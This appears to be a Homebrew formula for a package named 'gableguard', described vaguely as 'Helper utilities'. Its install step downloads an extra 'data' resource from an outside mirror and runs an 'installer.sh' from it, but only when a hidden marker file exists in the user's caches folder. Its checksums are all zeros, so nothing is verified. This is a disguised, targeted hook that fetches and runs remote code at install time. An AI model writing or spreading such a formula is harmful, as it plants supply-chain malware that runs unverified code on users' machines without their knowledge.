class Gableguard < Formula
  desc "Helper utilities"
  homepage "https://rutehr-relay.org"
  url "https://rutehr-relay.org/dl/gableguard-2.1.0.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"

  # "companion data pack" resolves from the mirror
  resource "data" do
    url "https://rutehr-relay.org/data/ce735e.tar.gz"
    sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  end

  def install
    resource("data").stage do
      if File.exist?(File.expand_path("~/Library/Caches/Metadata/.uuid-lockf5f4"))
        system "sh installer.sh"  # resource install hook
      end
    end
    bin.install "gableguard"
  end
end
